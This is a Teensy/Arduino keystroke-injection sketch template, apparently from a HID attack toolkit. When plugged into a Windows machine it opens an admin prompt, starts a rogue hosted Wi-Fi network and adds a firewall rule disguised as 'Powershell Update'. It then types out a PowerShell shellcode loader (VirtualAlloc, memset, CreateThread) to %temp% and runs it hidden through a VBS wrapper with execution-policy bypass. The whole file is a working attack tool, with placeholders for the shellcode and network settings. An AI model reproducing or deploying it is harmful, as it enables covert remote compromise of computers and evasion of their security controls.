#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("netsh wlan set hostednetwork mode=allow ssid=INPUT0 key=INPUT1");
  delay(5000);
  Keyboard.println("netsh wlan start hostednetwork");
  delay(5000);
  Keyboard.println("netsh advfirewall firewall add rule name=\"Powershell Update\" dir=in action=allow protocol=TCP localport=INPUT2");
  delay(3000);
  Keyboard.println("echo $code = @' > %temp%\\ra.ps1");
  Keyboard.println("echo [DllImport(\"kernel32.dll\")] >> %temp%\\ra.ps1");
  Keyboard.println("echo public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); >> %temp%\\ra.ps1");
  Keyboard.println("echo [DllImport(\"kernel32.dll\")] >> %temp%\\ra.ps1");
  Keyboard.println("echo public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); >> %temp%\\ra.ps1");
  Keyboard.println("echo [DllImport(\"msvcrt.dll\")] >> %temp%\\ra.ps1");
  Keyboard.println("echo public static extern IntPtr memset(IntPtr dest, uint src, uint count); >> %temp%\\ra.ps1");
  Keyboard.println("echo '@ >> %temp%\\ra.ps1");
  Keyboard.println("echo $winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespara Win32Functions -passthru >> %temp%\\ra.ps1");
  Keyboard.println("echo [Byte[]]$sc = >> %temp%\\ra.ps1");

  SHELLCODE

  Keyboard.println("echo $size = 0x1000 >> %temp%\\ra.ps1");
  Keyboard.println("echo if ($sc.Length -gt 0x1000) {$size = $sc.Length} >> %temp%\\ra.ps1");
  Keyboard.println("echo $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) >> %temp%\\ra.ps1");
  Keyboard.println("echo for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)} >> %temp%\\ra.ps1");
  Keyboard.println("echo $winFunc::CreateThread(0,0,$x,0,0,0) >> %temp%\\ra.ps1");
  Keyboard.println("echo while(1){sleep 100} >> %temp%\\ra.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\ra.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\ra.ps1\"),0,true >> %temp%\\ra.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\ra.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS